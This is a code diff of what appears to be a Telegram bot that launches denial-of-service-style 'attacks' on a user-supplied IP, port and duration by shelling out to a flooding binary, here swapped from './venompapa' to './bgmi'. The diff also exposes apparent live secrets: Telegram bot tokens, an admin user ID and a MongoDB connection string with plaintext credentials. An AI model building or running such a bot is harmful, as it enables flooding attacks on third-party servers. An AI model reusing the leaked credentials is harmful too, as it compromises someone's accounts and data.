@@ -9,7 +9,7 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7653230061:AAFafJOMG_7aldpqd-ArIBiWKEf88ie8-YQ'
+TELEGRAM_BOT_TOKEN = '7590135072:AAENl__hb2WpH2R7_KoGJpsu2XNPkmJx2U0'
 ADMIN_USER_ID = 7353797869
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "Roxz"
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./venompapa {ip} {port} {duration} {9} {900}"
+        command = f"./bgmi {ip} {port} {duration} {13} {600}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
